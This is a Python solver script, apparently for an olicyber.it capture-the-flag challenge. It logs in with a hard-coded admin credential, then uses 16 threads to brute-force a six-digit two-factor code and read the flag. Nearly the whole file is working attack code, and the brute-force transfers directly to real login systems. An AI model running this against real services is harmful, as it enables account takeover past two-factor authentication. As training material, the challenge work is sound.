import requests
import json
import threading


API = "http://securelogin.challs.olicyber.it/"
AUTH = {
    "username":"admin",
    "password":"5d08a95e13ee227fb04dfb425bcc690176a9680e1bc8192b7d55db57f3d9a38b"
}


class Solver(object):
    def __init__(self, limit: int = 1_000_000) -> None:
        self.s = requests.Session()
        self.lock = threading.Lock()
        self.cnt = 1
        self.limit = limit
        self.event = threading.Event()
        self.result = None
        
    def login(self) -> None:
        r = self.s.post(f'{API}/login', data=json.dumps(AUTH), headers={"Content-Type": "application/json"})
    
    def worker(self) -> None:
        with self.lock:
            pass
        
        while not self.event.is_set() and self.cnt < self.limit:
            with self.lock:
                code = self.cnt
                self.cnt += 1
                            
            r = self.s.get(f'{API}/2fa?code={code:06d}')
            
            if "Unauthorized" not in r.text:
                self.result = code
                self.event.set()
                break
    
    def solve(self, threads: int = 16) -> int:
        ths : list[threading.Thread] = []
        
        with self.lock:
            for _ in range(threads):
                th = threading.Thread(target=self.worker)
                ths.append(th)
                th.start()
                
        self.event.wait()
        
        for th in ths:
            th.join()
        
        return self.result or 0 
    
    def get_flag(self) -> str:
        r = self.s.get(f'{API}/user-info')
        out = r.json()
        return out['flag']
    
    @property
    def cookies(self):
        return self.s.cookies


if __name__ == '__main__':
    s = Solver()
    s.login()
    s.solve()
    print(s.get_flag())